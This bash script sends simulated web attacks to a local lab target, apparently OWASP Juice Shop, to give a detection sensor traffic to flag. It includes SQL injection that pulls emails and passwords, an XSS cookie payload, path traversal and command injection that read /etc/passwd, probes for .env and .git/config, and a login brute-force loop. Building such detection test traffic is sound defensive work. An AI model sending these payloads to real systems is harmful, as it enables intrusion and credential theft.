#!/usr/bin/env bash
# Sends simulated attacks to the LOCAL lab so the sensor has something to detect.
# Attacks come from 127.0.0.2 so the "attacker" has a different IP from you (127.0.0.1).
# Only run against systems you own or have written permission to test.
set -uo pipefail
T="${1:-http://localhost:8080}"
ATTACKER_IP="${ATTACKER_IP:-127.0.0.2}"

hit() {  # hit <path> [extra curl args...]
  code=$(curl -s -o /dev/null --max-time 5 --path-as-is --interface "$ATTACKER_IP" \
         -w "%{http_code}" "${@:2}" "$T$1")
  echo "  $code  $1"
}

echo "Attacking $T from $ATTACKER_IP"
echo "== SQL injection";      hit "/rest/products/search?q=1%27%20UNION%20SELECT%20email,password%20FROM%20Users--"
echo "== XSS";                hit "/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E"
echo "== Path traversal";     hit "/ftp/../../../../etc/passwd"
echo "== Command injection";  hit "/api/ping?ip=127.0.0.1%3Bcat%20%2Fetc%2Fpasswd"
echo "== Attack tool UA";     hit "/" -A "sqlmap/1.8.4#stable (https://sqlmap.org)"
echo "== Sensitive files";    hit "/.env"; hit "/.git/config"
echo "== Brute force (12 logins)"
for i in $(seq 1 12); do hit "/rest/user/login?email=admin@juice-sh.op&password=guess$i"; done
echo "== Directory scan (25 random paths)"
for i in $(seq 1 25); do hit "/api/hidden-$RANDOM"; done
echo "Done."
